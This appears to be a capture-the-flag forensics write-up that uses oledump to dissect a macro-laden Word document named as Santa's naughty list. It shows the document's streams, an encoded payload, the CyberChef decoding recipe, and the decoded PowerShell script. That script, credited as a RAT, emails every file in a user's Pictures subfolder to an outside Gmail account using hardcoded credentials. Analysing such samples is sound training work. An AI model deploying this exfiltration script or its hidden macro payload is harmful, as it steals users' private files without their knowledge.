# Fronsics - MACRO



.\oledump.py ..\..\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc
```bash
 1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7211 '1Table'
  5:    204592 'Data'
  6:        97 'Macros/GrinchEnterprisesWasHere/\x01CompObj'
  7:       318 'Macros/GrinchEnterprisesWasHere/\x03VBFrame'
  8:      1650 'Macros/GrinchEnterprisesWasHere/f'
  9:        84 'Macros/GrinchEnterprisesWasHere/o'
 10:       580 'Macros/PROJECT'
 11:       140 'Macros/PROJECTwm'
 12: M    1879 'Macros/VBA/GrinchEnterprisesWasHere'
 13: M     987 'Macros/VBA/Module1'
 14: m     924 'Macros/VBA/ThisDocument'
 15:      3501 'Macros/VBA/_VBA_PROJECT'
 16:       921 'Macros/VBA/dir'
 17:      4096 'WordDocument'
```

.\oledump.py -s 8 -d ..\..\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc

```bash
 $ H    @      }  k  ╞               0   .   (σ         Ç   T      Φ ÇGrinchEnterprisesIsComingForYou ▒ⁿ  º  ahNtWnl0cVNHa25EeREaT0BaYRNBWmFid3RlVkJ0ZVp1Tk9aenRURGhkSxNHa2FZbEobVUdrR1NHa3FPQEoWSUERE1VBdGVWQnRlWkdOT1p6dFRTamR5VUBKYRBATk8TQnQWTWprcUxCe25EentHT0ARGld5cGFwcnVyS2BETEhHe21PQE4WS0F0dhpqSEdaQnQWSUJgFmVBTXFPQE1hWkJ7bU9AWhdabmdqW3JkR1d6dE9Qb05tVUFwamhpa2FLQBBtEEEQaUhzcGl3cmQWE3p0SEh6ERpXQnQWTUdnYRNua0dWakRMSEAREhNAZW1PQE15T0BKYhpqYGlZQXtxVG9OR1d6dE9Qb05tVUFwamhpZBJZeVpiGmpkFk9HWhJVek5TT3oQckR3TnUTb0gSS0J0VFZ3dGVTQWYST0AQbUt5EXZoYEpxWUF7cVRqZxNEd051EG92GkpCTnVJR2BhbHl7clZ3dGVTQWAWd0F7cVRyEVtTeXQWE2hgcXdBe3FUdhF1WkdOdVpvYGISbGdAU2piTGhpa21XR2tiVnF0Fkt6TltPdhBtUGpnE0Rpa3FaR3R2aGBKcVlBe3FUb0htWnl0cU9BTXFTenRbWWpnE0R3TnUQb3YaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gWT0drR1VATldnQE51SHl0FhNCdGVQaGBxEkARdVpBTmVXeXBUSEBkZVlAEEdVQE5yU2BETGhpZBJZeVoWZEBOGldqZxNEak1tS0FNcUtAEGFaeXttT0FNcVl5ZHVQQnt5T0BNT2J5ERJLQnRUVnoRGldqRExoaWQSWXlaFnZBWhZheWRyTGpIR1pCdBZJQmAWZUFNcU9ATWFaQnttT0BaF1puZ2pbcmRHV3p0T1BvTm1VQXBqU2BETEhBe21Nb0hpVXlrSBpqT09VR3tqREBraU9AEXVWR2tuREJkZRF5cGFLQE1pU0dOdUhqcGpoYEpxV0ARQFZ2EHVKQk51SUdgYhpqYGlnQmtpU0AQcVd6e25EdRFPWUJkW1NAEHJKYERMSHlOT1B5e24acRF1E292bUxCdFtIcHtxT0FwYkppZHVWR0lTdXYTdXB2ZWlzcUhPbnF1W3JCdG0TR3tpT0ASW2tATk9WehFEWm5nalt7YGpoYEh5VUBOdUt6EURMaWR5U0FkdkRCdBdEaWR5U0FkdVloclMUYEpxS0drcUt6EUtXeXQWE2pnE0RBTnUQb3QaSkJOdUlHYGF3RnttE3l0E1Z3TnUTb0gSS0J0VFZye3ETenRtTEF0dVZHYGJXcntpTUd0Ek9BTXFuQnttE2pgcU5CdFtPb0h5EkFkW2x6dBJPYEpxV0ARQFZye3ETenRtTEF0dVZHa25WcnRxSGhgcUtHa3FLehFLV3l0FhNockxoRXJMSEAREhNAYBZ3eXQWSGhgcVdAEUBTYEpxS0drcUt6EUtXeXQWE29IcVNAEGFVQBF2TGh3UGhpZBJZeVoWZkJ7bVRBEG1PaGBIFA==     ≤  
```
from base64 -> xor key=35 to decimal -> base64
> link
```
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'Decimal','string':'35'%7D,'Standard',false)From_Base64('A-Za-z0-9%2B/%3D',true)&input=YWhOdFdubDBjVk5IYTI1RWVSRWFUMEJhWVJOQldtRmlkM1JsVmtKMFpWcDFUazlhZW5SVVJHaGtTeE5IYTJGWmJFb2JWVWRyUjFOSGEzRlBRRW9XU1VFUkUxVkJkR1ZXUW5SbFdrZE9UMXA2ZEZSVGFtUjVWVUJLWVJCQVRrOFRRblFXVFdwcmNVeENlMjVFZW50SFQwQVJHbGQ1Y0dGd2NuVnlTMkJFVEVoSGUyMVBRRTRXUzBGMGRocHFTRWRhUW5RV1NVSmdGbVZCVFhGUFFFMWhXa0o3YlU5QVdoZGFibWRxVzNKa1IxZDZkRTlRYjA1dFZVRndhbWhwYTJGTFFCQnRFRUVRYVVoemNHbDNjbVFXRTNwMFNFaDZFUnBYUW5RV1RVZG5ZUk51YTBkV2FrUk1TRUFSRWhOQVpXMVBRRTE1VDBCS1locHFZR2xaUVh0eFZHOU9SMWQ2ZEU5UWIwNXRWVUZ3YW1ocFpCSlplVnBpR21wa0ZrOUhXaEpWZWs1VFQzb1Fja1IzVG5VVGIwZ1NTMEowVkZaM2RHVlRRV1lTVDBBUWJVdDVFWFpvWUVweFdVRjdjVlJxWnhORWQwNTFFRzkyR2twQ1RuVkpSMkJoYkhsN2NsWjNkR1ZUUVdBV2QwRjdjVlJ5RVZ0VGVYUVdFMmhnY1hkQmUzRlVkaEYxV2tkT2RWcHZZR0lTYkdkQVUycGlUR2hwYTIxWFIydGlWbkYwRmt0NlRsdFBkaEJ0VUdwbkUwUnBhM0ZhUjNSMmFHQktjVmxCZTNGVWIwaHRXbmwwY1U5QlRYRlRlblJiV1dwbkUwUjNUblVRYjNZYVNrSk9kVWxIWUdGM1JudHRFM2wwRTFaM1RuVVRiMGdXVDBkclIxVkFUbGRuUUU1MVNIbDBGaE5DZEdWUWFHQnhFa0FSZFZwQlRtVlhlWEJVU0VCa1pWbEFFRWRWUUU1eVUyQkVUR2hwWkJKWmVWb1daRUJPR2xkcVp4TkVhazF0UzBGTmNVdEFFR0ZhZVh0dFQwRk5jVmw1WkhWUVFudDVUMEJOVDJKNUVSSkxRblJVVm5vUkdsZHFSRXhvYVdRU1dYbGFGblpCV2haaGVXUnlUR3BJUjFwQ2RCWkpRbUFXWlVGTmNVOUFUV0ZhUW50dFQwQmFGMXB1WjJwYmNtUkhWM3AwVDFCdlRtMVZRWEJxVTJCRVRFaEJlMjFOYjBocFZYbHJTQnBxVDA5VlIzdHFSRUJyYVU5QUVYVldSMnR1UkVKa1pSRjVjR0ZMUUUxcFUwZE9kVWhxY0dwb1lFcHhWMEFSUUZaMkVIVktRazUxU1VkZ1locHFZR2xuUW10cFUwQVFjVmQ2ZTI1RWRSRlBXVUprVzFOQUVISktZRVJNU0hsT1QxQjVlMjRhY1JGMUUyOTJiVXhDZEZ0SWNIdHhUMEZ3WWtwcFpIVldSMGxUZFhZVGRYQjJaV2x6Y1VoUGJuRjFXM0pDZEcwVFIzdHBUMEFTVzJ0QVRrOVdlaEZFV201bmFsdDdZR3BvWUVoNVZVQk9kVXQ2RVVSTWFXUjVVMEZrZGtSQ2RCZEVhV1I1VTBGa2RWbG9jbE1VWUVweFMwZHJjVXQ2RVV0WGVYUVdFMnBuRTBSQlRuVVFiM1FhU2tKT2RVbEhZR0YzUm50dEUzbDBFMVozVG5VVGIwZ1NTMEowVkZaeWUzRVRlblJ0VEVGMGRWWkhZR0pYY250cFRVZDBFazlCVFhGdVFudHRFMnBnY1U1Q2RGdFBiMGg1RWtGa1cyeDZkQkpQWUVweFYwQVJRRlp5ZTNFVGVuUnRURUYwZFZaSGEyNVdjblJ4U0doZ2NVdEhhM0ZMZWhGTFYzbDBGaE5vY2t4b1JYSk1TRUFSRWhOQVlCWjNlWFFXU0doZ2NWZEFFVUJUWUVweFMwZHJjVXQ2RVV0WGVYUVdFMjlJY1ZOQUVHRlZRQkYyVEdoM1VHaHBaQkpaZVZvV1prSjdiVlJCRUcxUGFHQklGQT09
```

```language
#Credits goes to @ManiarViral (https://twitter.com/maniarviral) for writing this awesome RAT!

$username="Grinch.Enterprises.2021@gmail.com"
$password="S@ntai$comingt0t0wn"
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage

$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)


$msg.From = "santaspresentsdelivery@gmail.com" 

$msg.To.Add("Grinch.Enterprises.2021@gmail.com") #ans

$msg.Body="Your presents have arrived!"

$msg.Subject = "Christmas Wishlist"

$files=Get-ChildItem "$env:USERPROFILE\Pictures\Grinch2021\"

Foreach($file in $files)
{
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
$attachment.Dispose();
$msg.Dispose();
```

.\oledump.py -s 7 -d ..\..\Santa_Claus_Naughty_List_2021\Santa_Claus_Naughty_List_2021.doc

```bash
VERSION 5.00
Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} GrinchEnterprisesWasHere
   Caption         =   "YouFoundGrinchCookie"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   StartUpPosition =   1  'CenterOwner
   TypeInfoVer     =   4
End
```